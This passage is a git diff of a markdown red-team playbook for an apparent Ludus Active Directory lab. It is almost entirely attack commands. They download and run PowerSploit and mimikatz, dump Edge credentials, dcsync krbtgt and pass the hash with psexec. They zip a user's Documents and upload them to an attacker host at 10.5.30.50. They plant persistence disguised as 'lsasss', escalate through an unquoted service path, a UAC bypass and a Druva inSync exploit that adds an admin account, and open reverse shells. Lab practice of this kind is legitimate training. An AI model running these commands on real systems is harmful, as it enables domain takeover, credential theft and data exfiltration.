@@ -8,7 +8,8 @@ win-server priviledged ludus\domainadmin
 
 ### win11 ludus\domainuser
 ```bash
-7z x -pinfected -mhe tools.7z tools
+cd /home/kali/ela/windows
+7z x -pinfected -mhe tools.7z .
 
 msfconsole -r user_handler.rc
 # windows run command on win11
@@ -26,7 +27,8 @@ ps
 enumdesktops
 getenv
 
-# shell
+# shell enum
+shell
 powershell
 echo %USERDOMAIN%
 nltest /dclist:ludus
@@ -103,6 +105,7 @@ type "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\C
 netstat -abno
 ```
 
+#### enumeration scripts
 
 ```shell
 # winpeas 
@@ -118,34 +121,46 @@ powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('h
 powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 10.5.20.0/24 -Ports '22,3389,5985,5986'"
 ```
 
-```bash
-use post/windows/gather/credentials/windows_autologin
-set session 1
-run
-
-evil-winrm -i 10.5.20.14 -u domainadmin -p password
-```
-
 ### Exfiltration
-
 ```shell
 cd %TEMP%
-upload CredentialKatz.exe
-.\CredentialKatz.exe
+upload CredentialKatz.exe 
+.\CredentialKatz.exe /edge
 
 # or it is possible to
 Get-Process msedge
 procdump -ma 1220 msedge_dump.dmp
 
+### on attacker
 python3 exfil.py
 
 Compress-Archive -Path 'C:\Users\domainuser\Documents' -Update -DestinationPath "$env:TEMP\documents.zip"; (New-Object Net.WebClient).UploadFile("http://10.5.30.50:80/upload", "$env:TEMP\documents.zip")
 ```
 
-## Unquoted service path exploit
+### Local Registry Key Persistence
+```bash
+use exploit/windows/local/persistence
+set LHOST 10.5.30.50
+set REG_NAME lsasss
+set EXE_NAME lsasss
+set PAYLOAD windows/meterpreter/reverse_tcp
+set session 1
+run
+```
+
+### Unpatched Software Priviledge Escalation
+```bash
+cd %TEMP%
+upload druva.ps1
+shell
+.\druva.ps1
+```
+
+## Unquoted Service Path Priviledge Escalation
 ```bash
 sc qc "DiskSorter"
 icacls "C:\Users\Public"
+### generate reverse meterpreter shell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.5.30.50 LPORT=1234 -f exe -o Disk.exe
 
 cd "C:\Users\Public"
@@ -155,8 +170,17 @@ icacls "C:\Users\Public\Disk.exe" /grant Everyone:F
 sc stop "DiskSorter"
 sc start "DiskSorter"
 
+### migrate asap to Teams process
 ps | grep teams
 migrate <teams>
+```
+
+### Enumerate Autologin Credentials
+```bash
+use post/windows/gather/credentials/windows_autologin
+set session 1
+run
+evil-winrm -i 10.5.20.14 -u domainadmin -p password
 ```
 
 ### win11 ludus\domainadmin
@@ -167,7 +191,10 @@ upload Akagi64.exe
 shell
 
 .\Akagi64.exe 33 "C:\Users\Public\Disk.exe"
+```
 
+## MIMI
+```bash
 # this does not work
 load kiwi
 creds_all
@@ -176,19 +203,16 @@ dcsync_lsa krbtgt
 
 python3 ~/Desktop/tools/impacket/examples/psexec.py 'domainadmin@10.5.20.13' -hashes :8846f7eaee8fb117ad06bdd830b7586c
 psexec \\10.5.20.13 -i -u ludus\domainadmin -p password cmd.exe
-```
 
-## MIMI
-
-```shell
-# mimikatz
 powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
 ```
 
-
+But this does work
 ```shell
 # you need administrator priviledges
 cd %TEMP%
+upload mimi*
+shell
 .\mimikatz.exe
 privilege::debug
 
@@ -212,24 +236,12 @@ PsExec.exe \\Desktop-1 cmd.exe
 
 ## Optional 
 
-### Reg Keys Persistence On Domain Member
-```
-use exploit/windows/local/registry_persistence
-set SESSION 1
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <your_ip>
-set LPORT 4444
-run
-```
-
 ### Service Persistence on Domain Controller
-```
+```bash
 use exploit/windows/local/persistence_service
-show options
-set LHOST
-set LPORT
-show option
-set SERVICE_NAME lsass
+set LHOST 10.5.30.50
+set LPORT 1337
+set SERVICE_NAME lsasss
 set sessions 2
 run 
 ```
@@ -238,28 +250,4 @@ run
 ```bash
 stty raw -echo; (stty size; cat) | nc -lvnp 1337
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.5.30.50 1337
-```
-
-### druva exploit
-```
-$ErrorActionPreference = "Stop"
-
-$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add & winrm quickconfig -force"
-
-$s = New-Object System.Net.Sockets.Socket(
-    [System.Net.Sockets.AddressFamily]::InterNetwork,
-    [System.Net.Sockets.SocketType]::Stream,
-    [System.Net.Sockets.ProtocolType]::Tcp
-)
-$s.Connect("127.0.0.1", 6064)
-
-$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
-$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
-$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
-$length = [System.BitConverter]::GetBytes($command.Length);
-
-$s.Send($header)
-$s.Send($rpcType)
-$s.Send($length)
-$s.Send($command)
 ```
